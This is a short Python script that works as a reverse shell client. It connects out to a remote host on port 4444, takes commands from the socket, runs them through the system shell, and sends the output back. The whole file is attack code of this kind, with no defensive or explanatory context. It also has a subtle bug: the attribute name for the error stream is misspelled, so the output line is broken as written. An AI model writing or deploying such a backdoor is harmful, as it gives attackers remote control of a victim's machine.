import socket
import subprocess

HOST = '' # remote host
PORT = 4444    # same port used on server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# loop forever
while 1:
	# recv command line param
	data = s.recv(1024)
	# execute command line
	proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	# grab output from commandline
	stdout_value = proc.stdout.read() + proc.sterr.read()
	# send back to origin
	s.send(stdout_value)
# quit out and kill socket
s.close()

